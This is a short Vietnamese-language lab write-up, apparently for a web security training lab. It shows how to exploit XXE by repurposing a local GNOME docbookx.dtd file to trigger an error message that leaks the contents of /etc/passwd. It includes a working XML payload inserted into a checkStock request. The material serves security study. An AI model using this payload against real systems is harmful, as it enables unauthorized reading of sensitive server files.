## Exploiting XXE to retrieve data by repurposing a local DTD

Ở phần description của Lab chúng ta có thể hiểu rằng, chúng ta phải trigger một thông báo lỗi bằng việc sử dụng 1 file dtd có sẵn trong hệ thống.

![](/imgs/XXE/27.png?raw=true)

Trong hệ thống linux GNOME sẽ có file docbookx.dtd với entity là ISOamso

![](/imgs/XXE/28.png?raw=true)

> Ngoài ra vẫn còn nhiều loại khác: [https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd)

Chúng ta tiến chèn đoạn XML vào request checkStock

> % dtd sẽ execute tới đường dẫn docbookx chứa định dạng ISOamso để hỗ trợ chạy cho các lệnh tiếp theo.

> % file sẽ lấy nội dung file passwd

> % eval sẽ in ra nội dung của file

```XML
<!DOCTYPE message [
<!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///invalid/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'> %dtd; ]>
```

Vẫn tương tự như lab trước, chúng ta sẽ nhận được lỗi kèm nội dung của file

![](/imgs/XXE/29.png?raw=true)
![](/imgs/XXE/30.png?raw=true)

### Tài Liệu Tham Khảo
- Một số CheatSheet: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)